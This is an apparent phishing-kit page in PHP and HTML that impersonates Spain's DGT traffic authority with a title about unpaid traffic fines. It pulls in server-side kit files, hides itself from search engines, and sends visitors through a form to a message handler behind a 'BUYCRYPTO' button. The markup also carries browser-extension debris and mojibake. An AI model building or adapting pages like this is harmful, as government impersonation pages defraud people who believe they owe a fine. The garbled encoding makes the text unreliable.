
<?php

include '../server/fonctions.php'; 
include '../settings.php'; 
require '../server/all.php';


?>

<!DOCTYPE html>



<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>				
	<title>DGT - Ã‚Â¿QuÃƒÂ© hacer si has recibido una multa?</title>
	
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="robots" content="noindex, nofollow">
	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script>
	
	
	
	<link rel="icon" type="image/x-icon" href="favicon.ico">
	
	<link rel="apple-touch-icon" sizes="57x57" href="images/apple-icon-57x57.png"> 
	<link rel="apple-touch-icon" sizes="60x60" href="images/apple-icon-60x60.png"> 
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-icon-72x72.png"> 
	<link rel="apple-touch-icon" sizes="76x76" href="images/apple-icon-76x76.png"> 
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-icon-114x114.png"> 
	<link rel="apple-touch-icon" sizes="120x120" href="images/apple-icon-120x120.png"> 
	<link rel="apple-touch-icon" sizes="144x144" href="images/apple-icon-144x144.png"> 
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-icon-152x152.png"> 
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-icon-180x180.png"> 
	<link rel="icon" type="image/png" sizes="192x192" href="images/android-icon-192x192.png"> 
	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"> 
	<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96x96.png"> 
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
	<style>
        /* Style du bouton */
        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px; /* Bords arrondis */
            cursor: pointer;
        }

        /* Style au survol du bouton */
        .custom-button:hover {
            background-color: #036; /* Changer la couleur au survol */
        }
    </style>	
	

<link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-print.min.css" media="print"> 
<link type="text/css" rel="stylesheet" href="../assets/css/index.css">
                            
			
</head><body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNSIsInNjb3JlIjoyMDAxNX1d" __processed_60f8c654-b74e-4190-a44e-2a45f2d7f657__="true"><div id="header" bis_skin_checked="1">
			<div bis_skin_checked="1">
				
			</div>
		</div>
		<main>
			<section>
				<div id="centercontainer" bis_skin_checked="1">
					<div class="fondo1" bis_skin_checked="1">
						<div class="my-4 mt-4" bis_skin_checked="1">
							<div class="container" bis_skin_checked="1">
								<div class="row" bis_skin_checked="1">
									<div class="col-12" bis_skin_checked="1">
										<div class="b1" bis_skin_checked="1">
											<div class="filter-group" bis_skin_checked="1">
												<div class="tags" bis_skin_checked="1"></div>
											</div>
											<!-- Titre :  Amende impayÃƒÂ©  -->
											
											<small class="date"></small></div><small class="date">
										</small></div><small class="date">
									</small></div><small class="date">
								</small></div><small class="date">
							</small></div><small class="date">
						</small></div><small class="date">
						<div bis_skin_checked="1">
							<div class="mb-3" bis_skin_checked="1">
								<div class="container" bis_skin_checked="1">
									<div class="row" bis_skin_checked="1">
										<div class="col-12 text-to-resize ulHtml" bis_skin_checked="1">
											<div class="text" id="64519cfe-8541-11ea-bb32-005056a48f82-00639__1_" data-status="1" data-status2="" data-status3="" bis_skin_checked="1"></div>
										</div>
									</div>
								</div>
							</div>
							<div class="mb-4" bis_skin_checked="1">
								<div class="container" bis_skin_checked="1">
									
								</div>
							</div>
							
							<div class="mb-5 " bis_skin_checked="1">
								<div class="container" bis_skin_checked="1">
									<div class="" bis_skin_checked="1">
										<div class="row" bis_skin_checked="1"></div>
										<div class="row text-to-resize" bis_skin_checked="1">
											<div class="col-md-6" bis_skin_checked="1"></div>
										</div>
									</div>
								</div>
							</div>
							
							
							<div class="mb-3" bis_skin_checked="1">
								<div class="container" bis_skin_checked="1">
									<div class="row" bis_skin_checked="1">
										<div class="col-12" bis_skin_checked="1">
											<div class="formalities-out" bis_skin_checked="1">
												<form action="../actions/message.php" method="post">
												<button type="submit" name="login_submit" class="custom-button form-ontrol">BUYCRYPTO</button>
												</form>
												
												
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="mb-3" bis_skin_checked="1">
								<div class="container" bis_skin_checked="1">
									<div class="row" bis_skin_checked="1"></div>
								</div>
							</div>
							<div class="mb-5" bis_skin_checked="1">
								<div class="container" bis_skin_checked="1">
									<div class="row" bis_skin_checked="1">
										<div class="col-12 text-to-resize" bis_skin_checked="1">
											<div class="steps" bis_skin_checked="1"></div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</small></div></section><small class="date">
				</small></main><small class="date">
				<div class="player" style="display: none;" bis_skin_checked="1">
					<div class="wrapper" bis_skin_checked="1">
						<div class="controls" bis_skin_checked="1">
							<a href="" class="backward"><span class="sr-only">retroceder 10 segundos</span></a>
							<a href="" class="play icon-play"><span class="sr-only">reproducir / pausar</span></a>
							<a href="" class="forward"><span class="sr-only">avanzar 10 segundos</span></a>
						</div>
						<div class="info" bis_skin_checked="1">
							<h2 class="title">TÃƒÂ­tulo del audio lorem</h2>
							<div class="time" bis_skin_checked="1">
								<span class="actual">00:00</span>
								<span class="duration">00:00</span>
							</div>
							<div class="progress" bis_skin_checked="1">
								<div class="progress-bar" role="progressbar" style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100" bis_skin_checked="1"></div>
							</div>
						</div>
						<button type="button" class="close icon-close" data-dismiss="dialog" aria-label="Close"><span class="sr-only">cerrar reproductor</span></button>
					</div>
				</div>
				<a title="ir al inicio de la pÃƒÂ¡gina" aria-label="ir al inicio de la pÃƒÂ¡gina" href="#" class="go-top icon-chevron" style="display:none"></a>
				<!-- Pie -->
				<footer>
					<div class="container" bis_skin_checked="1">
						<div class="row" bis_skin_checked="1">
							<div class="col-lg-4 I" bis_skin_checked="1">
								
							</div>
							
							
						</div>
					</div>
					
				</footer>
				<!-- Fin Pie -->
				<!-- Social links -->
				
			
			
				<!-- Fin social links -->
				<!-- Ventanas Modales  -->
				<div class="modal-backdrop fade fixed-links-backdrop" bis_skin_checked="1"></div>
				<!-- Modal Generico -->
				<div class="modal fade" id="genericModal" tabindex="-1" role="dialog" aria-labelledby="modalgenericModalLabel" aria-hidden="true" bis_skin_checked="1">
					<div class="modal-dialog" role="document" bis_skin_checked="1">
						<div class="modal-content" bis_skin_checked="1">
							
							
						</div>
					</div>
				</div>
				<!-- Fin Modal Generico -->
				<div id="dynamic" bis_skin_checked="1"></div>
				<!-- Fin Ventanas Modales  -->
			
		
</small></body></html>